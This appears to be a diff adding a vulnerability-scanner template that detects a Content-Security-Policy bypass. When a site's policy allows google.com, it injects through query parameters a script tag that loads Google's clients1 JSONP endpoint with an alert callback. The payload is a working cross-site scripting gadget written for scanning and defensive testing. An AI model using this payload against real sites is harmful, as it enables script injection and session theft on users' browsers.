@@ -1,0 +1,55 @@
+id: google-clients1-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via Google Clients1
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,google-clients1
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "google.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: google_clients1_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="http://clients1.google.com/complete/search?callback=alert&q=PIC&nolabels=t&client=youtube&ds=yt&_=1361575554883"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "google_clients1_csp_xss == true"
+# digest: 490a004630440220417aa1203e720b12879ba9a6806cc2cf5a335bcb3c8c85b2be12238bbbb6ba70022002d5bc0d15330e2f48bde3dbf94f090269fb2ad9a36d434728333c7e1c4206f5:922c64590222798bb761d5b6d8e72950
